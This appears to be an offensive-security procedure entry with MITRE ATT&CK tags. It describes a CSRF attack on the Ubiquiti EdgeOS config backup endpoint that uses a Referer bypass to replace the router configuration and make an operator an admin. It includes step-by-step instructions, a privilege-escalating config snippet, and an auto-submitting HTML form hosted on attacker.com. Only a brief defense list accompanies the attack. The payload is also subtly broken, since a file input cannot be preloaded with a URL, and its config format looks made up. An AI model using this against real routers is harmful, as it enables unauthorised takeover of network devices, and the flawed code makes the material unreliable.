---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - csrf
  - web-exploit
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:36.125Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious CSRF Page for Backup Replacement

## Summary

This procedure details creating an HTML-based CSRF payload that targets the Ubiquiti EdgeOS configuration backup endpoint, exploiting a Referer whitelist bypass to replace the router's config with a malicious one granting admin privileges.

## Description

The vulnerability in EdgeOS 1.9.1 and prior allows CSRF attacks on the backup feature because the Referer header check can be bypassed (e.g., by omitting or spoofing it). The attacker, with operator access, crafts a page that auto-posts a form to /api/config/backup or similar, uploading a tampered config file. This file modifies user roles, escalating the operator to admin. Prerequisites include operator access and a hosting service for the malicious page.

## Requirements

1. Knowledge of the router's backup endpoint (e.g., from source inspection or documentation)
2. A malicious configuration file (e.g., JSON/XML with elevated user privileges)
3. Text editor for HTML and a web server to host the page

## Defense

Defensive measures and detection strategies:

- Implement strict CSRF tokens in all state-changing endpoints
- Validate Referer headers comprehensively and log anomalies
- Disable or restrict backup features to admin-only with confirmation dialogs

## Objectives

1. Create an auto-submitting HTML form targeting the backup endpoint
2. Embed the malicious config upload to alter user privileges
3. Ensure bypass of Referer protection for successful execution

## Instructions

### Step 1: Prepare Malicious Configuration File

**Context**: Create or modify a router config file to escalate privileges.

Use a text editor to craft a config snippet (e.g., JSON) that changes the operator user's role to 'admin'. Example structure: {"users": {"operator": {"role": "admin"}}}.

Save as backup.cfg and host it on your server (e.g., via HTTP at http://attacker.com/malicious.cfg).

### Step 2: Build the CSRF HTML Page

**Context**: Develop the HTML form that posts to the vulnerable endpoint.

Create an HTML file with a form targeting the router's IP (replace with target IP). Use JavaScript to auto-submit on load. Omit or set Referer to a whitelisted domain to bypass checks.

Example HTML:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="http://192.168.1.1/api/config/backup" method="post" enctype="multipart/form-data">
<input type="file" name="backup" value="http://attacker.com/malicious.cfg">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Host this at http://attacker.com/csrf.html.

### Step 3: Test the Payload

**Context**: Verify the form triggers the backup replacement without errors.

Visit the page while logged in as operator on the router UI (in another tab). Check if the config uploads successfully by attempting admin actions post-test.

**Expected Output**: Form submits silently; router config updated if Referer bypass works.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- web-exploit
- payload-crafting
